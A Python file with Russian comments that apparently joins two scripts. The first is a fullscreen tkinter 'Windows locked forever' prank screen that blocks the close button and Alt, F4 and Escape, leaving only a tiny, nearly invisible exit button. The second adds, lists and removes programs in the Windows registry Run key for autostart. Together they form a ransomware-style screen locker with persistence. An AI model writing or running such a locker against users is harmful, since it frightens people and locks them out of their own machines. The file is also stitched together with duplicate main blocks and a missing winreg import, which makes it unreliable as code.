import tkinter as tk
import sys

def demo_blocker():
    root = tk.Tk()
    root.title("")
    root.geometry("800x600")
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    def exit_demo():
        root.destroy()
        sys.exit(0)
    
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Маленькая серая кнопка в правом нижнем углу
    btn_exit = tk.Button(
        root, 
        text="выход", 
        command=exit_demo,
        font=("Arial", 8),
        bg="#404040",
        fg="#606060",
        activebackground="#404040",
        activeforeground="#606060",
        relief=tk.FLAT,
        borderwidth=0,
        padx=3,
        pady=1
    )
    btn_exit.place(x=760, y=570, width=10, height=15)
    
    label = tk.Label(
        root, 
        text="WINDOWS ЗАБЛОКИРОВАН by Muravejchik! кстати это навсегда :)🐜 ", 
        font=("Arial", 36, "bold"), 
        fg="green", 
        bg="black"
    )
    label.pack(expand=True)
    
    def on_keypress(event):
        if event.keysym in ('Alt_L', 'Alt_R', 'F4', 'Escape'):
            return "break"
    
    root.bind_all('<Key>', on_keypress)
    root.mainloop()

if __name__ == "__main__":
    demo_blocker()
def add_to_startup(file_path=None, name="MyProgram"):
    """
    Добавляет программу в автозагрузку Windows (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    file_path: полный путь к исполняемому файлу (если None — использует путь текущего скрипта)
    name: название записи в реестре
    """
    if file_path is None:
        # Текущий скрипт (если это .exe или .py с ассоциацией)
        file_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        # Для .py скриптов нужно вызывать python.exe с параметром
        if not file_path.endswith('.exe'):
            file_path = f'python "{file_path}"'
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, file_path)
        return True, f"Добавлено: {name} -> {file_path}"
    except Exception as e:
        return False, f"Ошибка: {e}"

def remove_from_startup(name="MyProgram"):
    """Удаляет программу из автозагрузки"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, name)
        return True, f"Удалено: {name}"
    except Exception as e:
        return False, f"Не найдено или ошибка: {e}"

def list_startup():
    """Показывает все записи в автозагрузке текущего пользователя"""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    items = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    items.append((name, value))
                    i += 1
                except OSError:
                    break
    except:
        pass
    return items

if __name__ == "__main__":
    print("1. Добавить текущий скрипт в автозагрузку")
    print("2. Добавить свой файл")
    print("3. Удалить из автозагрузки")
    print("4. Показать все записи")
    choice = input("Выбор: ")
    
    if choice == "1":
        ok, msg = add_to_startup()
        print(msg)
    elif choice == "2":
        path = input("Полный путь к файлу (например, C:\\Windows\\notepad.exe): ")
        name = input("Название записи: ")
        ok, msg = add_to_startup(path, name)
        print(msg)
    elif choice == "3":
        name = input("Название записи для удаления: ")
        ok, msg = remove_from_startup(name)
        print(msg)
    elif choice == "4":
        for name, path in list_startup():
            print(f"{name} -> {path}")
    else:
        print("Неверный выбор")
    
    input("Нажми Enter...")
